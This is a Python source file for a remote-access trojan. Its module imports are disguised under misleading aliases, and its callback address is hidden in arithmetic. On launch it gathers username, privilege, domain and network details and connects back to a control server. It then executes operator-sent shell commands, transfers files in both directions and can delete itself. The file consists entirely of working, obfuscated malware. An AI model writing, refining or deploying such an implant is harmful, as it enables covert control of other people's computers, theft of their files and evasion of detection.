import socket as file, subprocess as sp, threading as proc, os as system, sys as machine, platform as fl, shlex as arr, time as zone
if system.name == 'nt': from win32comext.shell import shell
exit_event = proc.Event()
a = 10
datalen = 1024
def read(host_file):
    while True:
        try:
            data=host_file.recv(datalen)
            if not data:
                raise ValueError("Data not found")
        except:
            # system.remove(machine.argv[0])
            host_file.close()
            system._exit(0) 
        data=data.decode('UTF-8') 
        if ":msg:" in data:
            pass
        if ":login:" in data:
            whoami=system.getlogin()
            host_file.send(whoami.encode())
        if "run" in data:
            command=data.split("\n")[1]
            if system.name == 'nt':
                command = "cmd.exe /c " + command
            proc = sp.Popen(arr.split(command), stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE)
            output=proc.stdout.read().decode().strip().encode()
            proc.stdin.close()
            proc.terminate()
            host_file.sendall(b"\n"+output+b"\n:endofoutput:\n")
        if "self" in data: 
            system.remove(machine.argv[0])
            host_file.close()
            system._exit(0) 
        if "up" in data:
            host_file.send(b"SYN\n")
            data=data.split(":")
            exit_event.clear()
            handler = proc.Thread(target=rewrite, args=(host_file, "./" + data[2],int(data[3])))
            handler.daemon = True
            handler.start()
            while not exit_event.is_set():
                zone.sleep(1)
            host_file.send(b"ACK\n")
        if "~down~" in data:
            data=data.split("~")
            filepath = data[2]
            zone.sleep(3)
            if not system.path.isfile(filepath):
                host_file.send(b"error\n")
                zone.sleep(3)
                continue
            host_file.send(b"OK\n")
            filesize = str(system.path.getsize(filepath))
            host_file.send(filesize.encode())
            zone.sleep(2)
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    host_file.sendall(chunk)
            zone.sleep(3)
def rewrite(host_file, filepath, filesize):
    with open(filepath, 'wb') as f:
        received = 0
        while received < filesize:
            data = host_file.recv(4096)
            if not data:
                break
            if not "?keepalive?" in data.decode("UTF-8", errors="ignore"):
                f.write(data)
                received += len(data)
    exit_event.set()
def main():
    b = a ** 3 
    d="False"
    l="False"
    osinfo = ("\nOS family: " + system.name + 
              "\nOS name: " + fl.system() + 
              "\nOS release: " + fl.release() + 
              "\nOS version: " + fl.version() + 
              "\nOS platform: " + fl.platform())
    c = (b + (12 * 3)) // (len(d)-1 + 2)
    if system.name == 'nt':
        try:
            ipaddrinfo=sp.run("powershell.exe -command (Get-NetIPAddress -AddressFamily IPv4).IpAddress | findstr /V 169. | findstr /V 127.0.0.1", capture_output=True, text=True)
            ipaddrinfo=ipaddrinfo.stdout.strip()
        except:
            ipaddrinfo="No IP addresses active on system"
        try:
            domaininfo=sp.run("whoami /FQDN", capture_output=True, text=True)
            if "Unable" in domaininfo.stderr:
                d="False"
            else:
                d="True"
        except:
            pass
        gathering=sp.run("net user " + system.environ.get('USERNAME'), capture_output=True, text=True)
        if "Administrators" in gathering.stdout:
            l="True"
        if d == "True":    
            info=system.environ["userdomain"] + "\\" + system.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + l + "\n" + "Domain Joined: " + d + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
        else:
            info=system.environ.get('COMPUTERNAME') + "\\" + system.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + l + "\n" + "Domain Joined: " + d + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo
    else:
        try:
            ipaddrinfo = sp.run("ip -4 addr show | grep -oP '(?<=inet )\\d+(\\.\\d+){3}' | grep -v '^169\\.' | grep -v '^127.0.0.1'", capture_output=True, text=True, shell=True)
            ipaddrinfo=ipaddrinfo.stdout.strip()
        except:
            ipaddrinfo="No IP addresses"
        try:
            domaininfo=sp.run(["hostname", "-f"], capture_output=True, text=True).stdout.strip()
            if "." in domaininfo:
                d="True"
            else:
                d="False"
        except:
            pass
        gathering=sp.run(["sudo", "-v"] , capture_output=True, text=True)
        if "Sorry" not in gathering.stdout:
            l="True"
        info= domaininfo + "\\" + system.getlogin() + \
        "\nMember of Local Admins: " + l + \
        "\n" + "Domain Joined: " + d + \
        "\n" + "OS info: " + osinfo +\
        "\n" + "IP address info: " + "\n" + ipaddrinfo
    host_file = file.socket(file.AF_INET, file.SOCK_STREAM)
    host_file.connect((str((c * 2) - (3 ** 4) + (10 * 10 // 5) - 156) + "\u002E0." + "0.1", 4545))
    host_file.send(info.encode('UTF-8'))
    handler_thread = proc.Thread(target=read, args=(host_file, ))
    handler_thread.daemon=True
    handler_thread.start()
    while True:
        zone.sleep(1)
if __name__ == '__main__':
    main()